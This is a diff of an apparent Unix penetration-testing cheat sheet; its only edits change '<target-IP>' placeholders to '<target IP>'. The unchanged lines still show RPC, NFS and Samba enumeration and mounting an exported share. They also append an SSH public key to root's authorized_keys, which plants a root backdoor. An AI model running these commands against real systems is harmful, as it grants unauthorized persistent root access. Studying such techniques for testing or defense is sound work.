@@ -5,7 +5,7 @@ Unix
 
 rpcinfo -p <target-IP>
 
-showmount -e <target-IP>
+showmount -e <target IP>
 mount -t nfs -o nolock <target-IP>:/share /mnt/tmp
 
 cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
@@ -15,9 +15,9 @@ umount /mnt/tmp
 
 # Rstatd enabled
 
-rsysinfo <target-IP>
+rsysinfo <target IP>
 ------------------------------------------------------------------------------------------------------
 
 # Samba with a writeable file share
 
-smbclient -L //<target-IP>
+smbclient -L //<target IP>
